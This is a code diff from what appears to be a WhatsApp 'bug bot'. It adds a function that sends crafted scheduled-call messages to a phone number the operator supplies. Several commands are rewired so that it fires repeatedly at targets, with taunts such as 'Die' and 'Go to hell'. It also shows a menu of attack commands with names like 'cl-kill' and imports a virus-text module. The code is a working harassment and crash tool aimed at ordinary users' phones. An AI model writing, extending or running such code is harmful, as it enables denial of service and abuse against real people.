@@ -88,7 +88,19 @@ const ryobug = {
         }
     }
 }
-
+//================°
+const hmbug = async (target, txt) => {
+  await sleep(300);
+  var etc = {
+    scheduledCallCreationMessage: {
+      callType: 2,
+      scheduledTimestampMs: Date.now() + 86400000, // trigger
+      title: txt
+    }
+  }
+  zetsubo.relayMessage(target, etc, {})
+  await sleep(300);
+}
 
 //VIRTEX 
 const { ngazap } = require('./zetszet/virtex/ngazap')
@@ -1210,12 +1222,12 @@ case 'bugmenu': {
 ┏━━━━━━━━━━━━━━━━━━
 ┃➢ 𝐂𝐥𝐚𝐬𝐬𝐢𝐜-𝐫𝐚𝐩𝐞 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
 ┃➢ 𝐏𝐨𝐥𝐢𝐜𝐞-𝐂𝐚𝐬𝐞 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃➢ 𝐜𝐥-𝐤𝐢𝐥𝐥𝐛(254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃➢ 𝐜-𝐤𝐢𝐥𝐥 𝐚(254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+┃➢ 𝐜𝐥-𝐤𝐢𝐥𝐥(254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+┃➢ 𝐜-𝐤𝐢𝐥𝐥 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
 ┃➢ 𝐛𝐮𝐫𝐠𝐚𝐢𝐧 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
 ┃➢ 𝐒𝐥𝐞𝐞𝐩𝐲 (𝐝𝐢𝐫𝐞𝐜𝐭 𝐛𝐮𝐠 )
 ┃➢ 𝐞𝐯𝐢𝐥-𝐬𝐚𝐦
-┃➢ 𝐜𝐚𝐥𝐥1
+┃➢ 𝐛𝐮𝐠𝐥𝐢𝐬𝐭
 ┗━━━━━━━━━━━━━━━━━━
 
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 © 𝙲𝚕𝚊𝚜𝚜𝚒𝚌 𝙱𝚘𝚝 𝙰𝚍𝚖𝚒𝚗𝚜 
@@ -2540,9 +2552,9 @@ if (!isCreator) return reply(mess.premium)
 if (!text) return reply(`Example: ${prefix + command} 25472823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
 jumlah = q.split(",")[1]
-ryobug(sendto, `CLASSIC BOT 🤧💀 ...~${ios1}`)
+hmbug(sendto, `CLASSIC BOT 🤧💀 ...~${ios1}`)
 await sleep(5000)
-ryobug(sendto, `CLASSIC BOT 💀${ios1}`)
+hmbug(sendto, `CLASSIC BOT 💀${ios1}`)
 await sleep(5000)
 reply(mess.bugrespon + `\n❗Detail > \n😎 Target Number: ${sendto} \nBug Command: ${command}\n😋 Quantity: ${jumlah}`)
 }
@@ -2556,25 +2568,25 @@ if (!isCreator) return reply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
 jumlah = q.split(",")[1]
-ryobug(sendto, jumlah,  `I even Dont know 💀 `)
+hmbug(sendto, jumlah,  `I even Dont know 💀 `)
 await sleep(1000)
 await ryobug(sendto, jumlah,  `💔'҉Why You messed with❤️‍🩹`)
 await sleep(1000)
 await ryobug(sendto, jumlah,  `Classic Bot 🫂`)
 await sleep(1000)
-ryobug(sendto, jumlah,  `Go to hell 😕 `)
+hmbug(sendto, jumlah,  `Go to hell 😕 `)
 await sleep(1000)
 await ryobug(sendto, jumlah,  `💔'҉No mercy for you 🙈`)
 await sleep(1000)
 await ryobug(sendto, jumlah,  `Huh?`)
 await sleep(1000)
-ryobug(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 Die 🎲 `)
+hmbug(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 Die 🎲 `)
 await sleep(1000)
 await ryobug(sendto, jumlah,  `💔'҉🙈😕😕❤️‍🩹`)
 await sleep(1000)
 await ryobug(sendto, jumlah,  `😈`)
 await sleep(1000)
-ryobug(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠`)
+hmbug(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠`)
 await sleep(1000)
 await ryobug(sendto, jumlah,  `💔'҉😭❤️‍🩹`)
 await sleep(1000)
